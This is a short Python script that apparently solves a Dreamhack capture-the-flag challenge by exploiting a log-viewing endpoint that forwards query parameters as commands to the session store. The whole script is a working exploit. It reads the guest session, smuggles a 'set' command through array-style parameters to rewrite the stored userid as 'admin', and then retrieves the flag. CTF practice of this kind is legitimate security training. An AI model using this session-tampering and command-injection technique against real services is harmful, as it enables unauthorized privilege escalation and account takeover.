import requests
from urllib.parse import unquote
import json

url = "http://host3.dreamhack.games:10124/"
s = requests.Session()

# login
res = s.get(f'{url}/login', params={
    'userid': 'guest',
    'userpw': 'guest'
})

# get session cookie
cookie = unquote(res.cookies['connect.sid'])
sess = cookie[cookie.index(':') + 1:].split(".")[0]

res = s.get(f'{url}/show_logs?log_query=get/sess:{sess}')

payload = json.loads(res.text)

# admin login
payload['userid'] = 'admin'

res = s.get(f'{url}/show_logs?log_query[0]=set&log_query[1][]=sess:{sess}&log_query[1][]={json.dumps(payload)}')

if res.text.lower() == "ok":
    print("> Logged in as admin")

# get flag
res = s.get(f'{url}/flag')
print("Flag:", res.text)